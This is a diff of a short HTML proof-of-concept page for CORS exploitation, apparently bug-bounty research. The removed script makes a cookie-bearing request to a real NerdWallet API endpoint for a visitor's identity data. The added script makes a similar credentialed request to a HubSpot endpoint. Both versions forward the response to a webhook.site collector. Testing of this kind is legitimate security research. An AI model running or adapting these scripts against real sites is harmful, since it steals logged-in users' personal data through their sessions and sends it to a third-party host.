@@ -1,30 +1,26 @@
+<!DOCTYPE html>
 <html>
   <body>
-    <h2>💥 CORS Exploit Running...</h2>
-
     <script>
-      // Replace this with your webhook listener (e.g., requestbin, webhook.site)
-      const webhook = "https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e";
-
-      // The target vulnerable API endpoint
-      const target = "https://www.nerdwallet.com/api/supergraph";
-
-      fetch("https://www.nerdwallet.com/api/supergraph", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json",
-    "Referer": "https://www.nerdwallet.com/"
-    
-  },
-         body: JSON.stringify({ "operationName":"GetIdentityDataForWebPush","variables":{},"query":"query GetIdentityDataForWebPush {\n  rawIdentity {\n    data\n    __typename\n  }\n}\n" })
-})
-.then(res => res.text())
-.then(data => fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
-  method: "POST",
-  body: data,
-  mode: "no-cors"
-}));
+      fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=oauth-ui", {
+        method: "POST",
+        credentials: "include",  // Important to send cookies
+        headers: {
+          "Content-Type": "text/plain;charset=UTF-8"
+        },
+        body: JSON.stringify({
+          message: "CORS PoC from attacker site",
+          tags: { poc: true }
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        // Send it to your webhook or log it
+        fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
+          method: "POST",
+          body: data
+        });
+      });
     </script>
   </body>
 </html>
